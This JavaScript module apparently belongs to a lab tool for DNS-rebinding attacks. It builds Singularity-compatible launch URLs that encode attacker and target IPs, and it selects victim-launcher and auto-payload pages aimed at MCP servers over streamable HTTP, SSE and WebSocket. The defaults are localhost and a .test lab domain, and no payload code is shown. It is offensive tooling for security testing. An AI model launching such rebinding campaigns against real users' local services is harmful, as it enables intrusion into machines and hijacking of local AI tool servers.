const DEFAULT_ATTACKER_IP = "127.0.0.1";
const DEFAULT_TARGET_IP = "127.0.0.1";
const DEFAULT_LAB_DOMAIN = "example.test";
const DEFAULT_LAUNCHER_PORT = 8080;
const DEFAULT_STRATEGY = "fs";
const DEFAULT_LAUNCHER_PAYLOAD = "payloads/victim-launcher.html";

export function buildRebindLaunch(finding, options = {}) {
  const descriptor = buildSingularityDescriptor(finding, options);
  return {
    url: descriptor.launchUrl,
    host: descriptor.host,
    campaignId: descriptor.campaignId,
    port: descriptor.port,
    path: descriptor.path,
    transport: descriptor.transport,
    payload: descriptor.metadata.payload,
    attackerIp: descriptor.metadata.attackerIp,
    targetIp: descriptor.metadata.targetIp,
    labDomain: descriptor.metadata.labDomain,
    strategy: descriptor.metadata.strategy,
    launcherPort: descriptor.metadata.launcherPort
  };
}

export function buildSingularityDescriptor(finding, options = {}) {
  const port = normalizePort(options.port || finding?.port);
  const transport = normalizeTransport(options.transport || finding?.fingerprint?.transport);
  const path = normalizePath(options.path || pathFromFinding(finding) || defaultPathForTransport(transport));
  const labDomain = normalizeDomain(options.labDomain || DEFAULT_LAB_DOMAIN);
  const attackerIp = normalizeIpv4(options.attackerIp || DEFAULT_ATTACKER_IP, "attacker IP");
  const targetIp = normalizeIpv4(options.targetIp || DEFAULT_TARGET_IP, "target IP");
  const launcherPort = normalizePort(options.launcherPort || DEFAULT_LAUNCHER_PORT);
  const strategy = normalizeToken(options.strategy || DEFAULT_STRATEGY, "strategy");
  const launcherPayload = normalizePayload(options.launcherPayload || DEFAULT_LAUNCHER_PAYLOAD);
  const campaignId = normalizeCampaignId(options.campaignId || `c-${randomLabel()}`);
  const payload = normalizePayload(options.payload || defaultPayloadForTransport(transport));
  const host = `s-${ipToHex(attackerIp)}.${ipToHex(targetIp)}-${randomLabel()}-${strategy}-e.${labDomain}`;
  const query = new URLSearchParams({
    campaign: campaignId,
    transport,
    path,
    payload,
    name: `${transport} ${path}`,
    ports: String(port)
  });

  if (transport === "websocket" && options.subprotocol) {
    query.set("subprotocol", String(options.subprotocol));
  }

  const launchUrl = `http://${host}:${launcherPort}/${launcherPayload}?${query.toString()}`;

  return {
    provider: "singularity-compatible",
    mode: "generated",
    launchUrl,
    probeUrl: `http://${host}:${port}${path}`,
    host,
    campaignId,
    port,
    path,
    transport,
    metadata: {
      payload,
      attackerIp,
      targetIp,
      labDomain,
      strategy,
      launcherPort,
      launcherPayload
    }
  };
}

export function buildCustomUrlDescriptor(value, options = {}) {
  const url = new URL(String(value || "").trim());
  if (url.protocol !== "http:" && url.protocol !== "https:") {
    throw new Error("Custom rebind URL must use HTTP or HTTPS.");
  }

  const transport = normalizeTransport(options.transport || url.searchParams.get("transport"));
  const port = normalizePort(options.port || firstPort(url.searchParams.get("ports")) || url.port || defaultPortForProtocol(url.protocol));
  const path = normalizePath(options.path || url.searchParams.get("path") || defaultPathForTransport(transport));
  const probeUrl = new URL(url.toString());
  probeUrl.port = String(port);
  probeUrl.pathname = path;
  probeUrl.search = "";
  probeUrl.hash = "";

  return {
    provider: "custom-url",
    mode: "manual",
    launchUrl: url.toString(),
    probeUrl: probeUrl.toString(),
    host: url.hostname,
    port,
    path,
    transport,
    campaignId: normalizeCampaignId(options.campaignId || url.searchParams.get("campaign") || `c-${randomLabel()}`),
    metadata: {
      originalPort: url.port || defaultPortForProtocol(url.protocol),
      originalPath: url.pathname
    }
  };
}

export function labDefaultsFromStorage(raw = {}) {
  return {
    labDomain: stringOrDefault(raw.labDomain, DEFAULT_LAB_DOMAIN),
    attackerIp: stringOrDefault(raw.attackerIp, DEFAULT_ATTACKER_IP),
    targetIp: stringOrDefault(raw.targetIp, DEFAULT_TARGET_IP),
    launcherPort: stringOrDefault(raw.launcherPort, String(DEFAULT_LAUNCHER_PORT)),
    strategy: stringOrDefault(raw.strategy, DEFAULT_STRATEGY),
    dashboardBase: stringOrDefault(raw.dashboardBase, "")
  };
}

function defaultPathForTransport(transport) {
  if (transport === "sse") {
    return "/sse";
  }

  if (transport === "websocket") {
    return "/";
  }

  return "/mcp";
}

function defaultPayloadForTransport(transport) {
  if (transport === "sse") {
    return "payloads/auto-sse.html";
  }

  if (transport === "websocket") {
    return "payloads/auto-ws.html";
  }

  return "payloads/auto-streamable.html";
}

function defaultPortForProtocol(protocol) {
  return protocol === "https:" ? 443 : 80;
}

function firstPort(value) {
  const raw = String(value || "").split(",")[0].trim();
  return raw || "";
}

function pathFromFinding(finding) {
  const endpoint = finding?.fingerprint?.endpoint || finding?.baseUrl;

  try {
    return endpoint ? new URL(endpoint).pathname : "";
  } catch {
    return "";
  }
}

function normalizeTransport(value) {
  const normalized = String(value || "").trim().toLowerCase();

  if (normalized === "legacy-sse" || normalized === "sse") {
    return "sse";
  }

  if (normalized === "websocket" || normalized === "ws") {
    return "websocket";
  }

  return "streamable";
}

function normalizePath(value) {
  const raw = String(value || "").trim();

  if (!raw) {
    return "/mcp";
  }

  if (raw === "/") {
    return "/";
  }

  return raw.startsWith("/") ? raw : `/${raw}`;
}

function normalizePayload(value) {
  const raw = String(value || "").trim().replace(/\\/g, "/");

  if (!raw || raw.includes("..") || raw.startsWith("/") || raw.includes("?") || raw.includes("#")) {
    throw new Error("Invalid payload path.");
  }

  return raw;
}

function normalizePort(value) {
  const port = typeof value === "number" ? value : Number.parseInt(String(value || ""), 10);

  if (!Number.isInteger(port) || port < 1 || port > 65535) {
    throw new Error(`Invalid port: ${value}`);
  }

  return port;
}

function normalizeDomain(value) {
  const domain = String(value || "").trim().toLowerCase();

  if (!/^[a-z0-9.-]+$/.test(domain) || domain.includes("..") || domain.startsWith(".") || domain.endsWith(".")) {
    throw new Error("Invalid lab domain.");
  }

  return domain;
}

function normalizeIpv4(value, label) {
  const ip = String(value || "").trim();
  const parts = ip.split(".");

  if (parts.length !== 4) {
    throw new Error(`Invalid ${label}: ${value}`);
  }

  for (const part of parts) {
    const numeric = Number(part);

    if (!Number.isInteger(numeric) || numeric < 0 || numeric > 255 || String(numeric) !== part) {
      throw new Error(`Invalid ${label}: ${value}`);
    }
  }

  return ip;
}

function normalizeToken(value, label) {
  const token = String(value || "").trim();

  if (!/^[a-z0-9_-]+$/i.test(token)) {
    throw new Error(`Invalid ${label}.`);
  }

  return token;
}

function normalizeCampaignId(value) {
  return normalizeToken(value, "campaign id");
}

function ipToHex(ip) {
  return ip.split(".").map((part) => Number(part).toString(16).padStart(2, "0")).join("");
}

function randomLabel() {
  return `${Date.now().toString()}${Math.random().toString(16).slice(2, 10)}`;
}

function stringOrDefault(value, fallback) {
  const text = String(value || "").trim();
  return text || fallback;
}
